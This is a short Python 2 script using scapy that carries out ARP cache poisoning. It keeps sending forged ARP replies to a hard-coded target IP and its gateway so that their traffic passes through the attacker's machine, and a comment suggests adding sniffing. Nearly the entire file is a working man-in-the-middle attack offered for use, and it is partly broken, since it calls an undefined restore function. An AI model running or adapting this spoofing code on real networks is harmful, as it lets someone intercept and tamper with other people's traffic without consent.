#!coding=utf-8

from scapy.all import *
import os
import sys
import threading
import signal

'''
这是一个arp欺骗的代码，可以再加上嗅探功能！
'''

def poison_target(gateway_ip,gateway_mac,target_ip,target_mac):
	poison_target=ARP()
	poison_target.op=2
	poison_target.psrc=gateway_ip
	poison_target.pdst=target_ip
	poison_target.hwdst=target_mac

	poison_gateway=ARP()
	poison_gateway.op=2
	poison_gateway.psrc=target_ip
	poison_gateway.pdst=gateway_ip
	poison_gateway.hwdst=gateway_mac

	print "[*]Beging the ARP poison"

	while True:
		try:

			send(poison_target)
			send(poison_gateway)
			time.sleep(1)
		except KeyboardInterrupt:
			restore_target(gateway_ip,gateway_mac,target_ip,target_mac)

	print "[*]ARP poison attack finished"

	return 


if __name__=="__main__":

	interface='eth0'
	target_ip='10.0.3.54'
	gateway_ip='10.0.3.1'
	gateway_mac='f0:25:72:52:d7:c2'
	target_mac='D8:CB:8A:7D:C5:F1'
	packet_count=100
	conf.iface=interface

	conf.verb=0
	print "[*]Setting up %s" % interface

	if gateway_mac is None:
		print "[!!!]Failed to get gateway MAC.Exiting."
		sys.exit(0)
	else:
		print "[*]gateway %s is at %s" % (gateway_ip,gateway_mac)

	if target_mac is None:
		print "[!!!]Failed to get target MAC.Exiting."
		sys.exit(0)
	else:
		print "[*]target %s is at %s" % (target_ip,target_mac)

	poison_thread=threading.Thread(target=poison_target,args=(gateway_ip,gateway_mac,target_ip,target_mac))
	poison_thread.start()
